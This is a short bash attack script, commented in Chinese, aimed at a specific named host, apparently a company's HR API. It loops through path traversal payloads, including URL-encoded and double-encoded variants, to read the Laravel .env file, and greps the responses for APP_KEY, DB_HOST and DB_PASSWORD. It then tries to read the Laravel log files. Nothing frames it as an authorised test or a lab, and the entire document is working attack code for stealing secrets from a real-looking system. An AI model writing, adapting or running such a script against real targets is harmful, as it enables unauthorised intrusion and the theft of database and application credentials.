#!/bin/bash

TARGET="hrm-api.ghtk.vn"

echo "[*] 尝试读取Laravel .env文件..."
echo ""

# 路径穿越payload列表
PAYLOADS=(
    "/.env"
    "/../.env"
    "/../../.env"
    "/../../../.env"
    "/storage/../.env"
    "/storage/../../.env"
    "/api/../.env"
    "/..;/.env"
    "/%2e%2e/.env"
    "/%2e%2e%2f.env"
    "/..%2f.env"
    "/..%252f.env"
    "/storage../.env"
    "/storage/logs/../../.env"
)

for payload in "${PAYLOADS[@]}"; do
    echo -n "  $payload → "
    resp=$(curl -sk "https://$TARGET$payload" -m 3 2>&1)
    
    # 检查是否包含.env特征
    if echo "$resp" | grep -qE "APP_NAME|APP_KEY|DB_HOST|DB_PASSWORD"; then
        echo "✅ 成功读取！"
        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        echo "$resp"
        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        break
    else
        echo "❌"
    fi
done

echo ""
echo "[*] 尝试读取Laravel日志..."
LOG_PATHS=(
    "/storage/logs/laravel.log"
    "/storage/logs/laravel-$(date +%Y-%m-%d).log"
)

for log in "${LOG_PATHS[@]}"; do
    echo -n "  $log → "
    resp=$(curl -sk "https://$TARGET$log" -m 3 2>&1)
    
    if echo "$resp" | grep -qE "\[20[0-9]{2}-"; then
        echo "✅ 日志可读！"
        echo "$resp" | head -50
    else
        echo "❌"
    fi
done

